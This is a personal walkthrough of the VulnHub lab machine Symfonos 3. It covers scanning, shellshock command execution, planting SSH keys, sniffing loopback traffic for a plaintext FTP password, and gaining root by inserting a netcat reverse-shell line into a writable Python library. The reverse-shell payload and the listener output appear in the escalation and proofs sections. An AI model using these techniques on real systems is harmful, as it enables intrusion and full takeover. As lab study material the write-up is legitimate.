# BOX NAME: Symfonos 3
**LINK**: https://www.vulnhub.com/entry/symfonos-31,332/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the box and fall into a rabbit-hole looking for anything else than a shellshock vulnerability. 
2. Exploit the shellshock vulnerability, gain persistence with ssh-keys.
3. figure out to listen to the tcp traffic and then dump the contents and find a password.
4. Pivot user and find wierd groups here also.
5. Manipulate the permissions on python2.7 libraries to get a reverse shell as root.

great box! got me scribbling down a simple python script to manipulate the shellshock vulnerability. quite fun! And to get to intercept network traffic to find a plain-text password was also intuitive.

Good box and great fun!
```

</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.58
[+] URL:	http://symfonos.local
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-symfonos3.log                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 14:10 CEST
Nmap scan report for symfonos.local (10.77.0.58)
Host is up (0.00028s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd64727680517ba8c7fdb266fab6980c (RSA)
|   256 74e59a5a4c1690cad8f7c778e75a8681 (ECDSA)
|_  256 3ce40bb9dbbf018ab79c42bccb1e416b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-symfonos3.log 
http://symfonos.local [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.77.0.58]

```

nikto-scan

```
└─$ nikto -h $IP -C all | tee nikto-symfonos3.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.58
+ Target Hostname:    10.77.0.58
+ Target Port:        80
+ Start Time:         2023-04-28 14:10:21 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME ty
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: f1, size: 58e15fe4052c8, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cg
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 26640 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-04-28 14:12:20 (GMT2) (119 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
/cgi-bin/ --- I wonder, I wonder...
icons
gate
```

```
ffuf -u $URL/cgi-bin/FUZZ -w /base/wordlists/web-fuzz/directory-list-2.3-big.txt -mc 200 | tee ffuf-dir-cgi-bin-symfonos3.log
/cgi-bin/underworld
```
```
http://symfonos.local/ 
http://symfonos.local/gate 
http://symfonos.local/gate/cerberus 
http://symfonos.local/gate/cerberus/tartarus
http://symfonos.local/gate/cerberus/tartarus/research 
http://symfonos.local/gate/cerberus/tartarus/acheron 
http://symfonos.local/gate/cerberus/tartarus/phlegethon 
http://symfonos.local/gate/cerberus/tartarus/cocytus 
http://symfonos.local/gate/cerberus/tartarus/hermes 
http://symfonos.local/gate/cerberus/tartarus/charon
http://symfonos.local/gate/cerberus/tartarus/hecatoncheires
``` 

I wrote a script to abuse the shellshock vulnerability.
python3 jml-ShellShock.py -U http://symfonos.local/cgi-bin/underworld/
```
└─$ python3 jml-ShellShock.py -U http://symfonos.local/cgi-bin/underworld/
[+] What is your command?: whoami
cerberus

[+] What is your command?: i
[-] Command not found

[+] What is your command?: id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)

[+] What is your command?: 

```
```
[+] What is your command?: wget 10.77.0.35/id_rsa.pub -O /home/cerberus/.ssh/authorized_keys

 Did you notice the groups?
```
```
cd /tmp
tcpdump -i lo -w file.pcap -G 300
scp -i id_rsa cerberus@symfonos.local:/tmp/file.pcap file.pcap
```
```
220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
USER hades
331 Password required for hades
PASS PTpZTfU4vxgzvRBE
230 User hades logged in
CWD /srv/ftp/
250 CWD command successful
```
```
hades@symfonos3:~$ id
uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)

find / -type f -user hades 2>/dev/null | grep -v proc
find / -type f -group hades 2>/dev/null | grep -v proc
find / -type f -group gods 2>/dev/null | grep -v proc

So it seems hades has a specific python-script. and the group "gods" seem to be in full control of /usr/lib/python2.7.
```
```
hades@symfonos3:~$ cat /opt/ftpclient/ftpclient.py
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()


hades@symfonos3:~$ nano /opt/ftpclient/ftpclient.py
hades@symfonos3:~$ nano /usr/lib/python2.7/ftplib.py
-->> os.system("nc 172.168.0.108 4445 -e /bin/bash")

```
</details>
<details><summary><ins>OTHER</ins></summary>


</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/srv/ftp/statuscheck.txt
/opt/ftpclient/ftpclient.py
/opt/ftpclient/statuscheck.txt
```

**SUID's**:

```
/usr/sbin/exim4
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/mount
/bin/ping
/bin/su
```
**SGID's**:

```
/sbin/unix_chkpwd
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/mlock
```
**OTHERS**:

```
/usr/lib/python2.7*
```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=7532b35bfa04c32c8b83bb7f66777ddfa1a8c7ff, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.9 (stretch)
Release:        9.9
Codename:       stretch


Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

cerberus
hades:PTpZTfU4vxgzvRBE
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
hades@symfonos3:~$ nano /usr/lib/python2.7/ftplib.py
-->> os.system("nc 172.168.0.108 4445 -e /bin/bash")

nc -lnvp 4445
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.77.0.35] from (UNKNOWN) [10.77.0.58] 60710
id
uid=0(root) gid=0(root) groups=0(root)
```
```
cat /root/proof.txt

        Congrats on rooting symfonos:3!
                                        _._
                                      _/,__\,
                                   __/ _/o'o
                                 /  '-.___'/  __
                                /__   /\  )__/_))\
     /_/,   __,____             // '-.____|--'  \\
    e,e / //  /___/|           |/     \/\        \\
    'o /))) : \___\|          /   ,    \/         \\
     -'  \\__,_/|             \/ /      \          \\
             \_\|              \/        \          \\
             | ||              <    '_    \          \\
             | ||             /    ,| /   /           \\
             | ||             |   / |    /\            \\
             | ||              \_/  |   | |             \\
             | ||_______________,'  |__/  \              \\
              \|/_______________\___/______\_             \\
               \________________________     \__           \\        ___
                  \________________________    _\_____      \\ _____/
                     \________________________               \\
        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

        Contact me via Twitter @zayotic to give feedback!
```
</details>